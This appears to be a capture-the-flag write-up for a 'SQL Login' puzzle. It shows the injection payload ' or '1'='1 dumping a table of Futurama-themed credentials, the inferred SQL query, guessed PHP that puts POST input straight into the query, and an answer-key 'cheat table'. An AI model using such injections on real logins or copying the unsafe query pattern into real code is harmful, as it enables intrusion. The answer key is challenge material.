# SQL Login

Figure out the password to login.

Get the password for user: fry

Enter the login password.

## Solution

Enter

```plain
' or '1'='1
```

It directly gives you the SQL query result. (This may be impossible for any website)

```plain
admin,Gu3ss_Myp4s%w0rd**
bender,b1t3-my-shiny-m3t4l-4$$
fry,w4ts-w/-th3-17-dungbeetles
farnsworth,P4zuzu!!
scruffy,Im_0n-br3ak
zoidberg,sp4r3-ch4ng3#$$$
```

Enter the password will solve the problem.

```plain
w4ts-w/-th3-17-dungbeetles
```

## Further

Enter

```plain
'
```

This may cause SQL syntax error.

And we got SQL error messages. We can find that the SQL is

```sql
SELECT username, password FROM users WHERE username='fry' AND password='$1'
```

We can't get this problem solved with only one request. We must enter the password in the second request.

I think the code might be

```php
<?php
$mysqli = new mysqli("localhost", "username", "password", "database");
if ($mysqli->connect_errno) {
    exit();
}
$result = $mysqli->query("SELECT username, password FROM users WHERE username='fry' AND password='$_POST['answer']'");
if ($result) {
    $row = $result->fetch_assoc();
    if ($row) {
        if ($_POST['answer'] === $row["password"]) {
            $solved = true;
        }
    }
}
```

## Cheat Table

| username   | password                   |
| :--------- | :------------------------- |
| admin      | Gu3ss_Myp4s%w0rd**         |
| bender     | b1t3-my-shiny-m3t4l-4$$    |
| fry        | w4ts-w/-th3-17-dungbeetles |
| farnsworth | P4zuzu!!                   |
| scruffy    | Im_0n-br3ak                |
| zoidberg   | sp4r3-ch4ng3#$$$           |
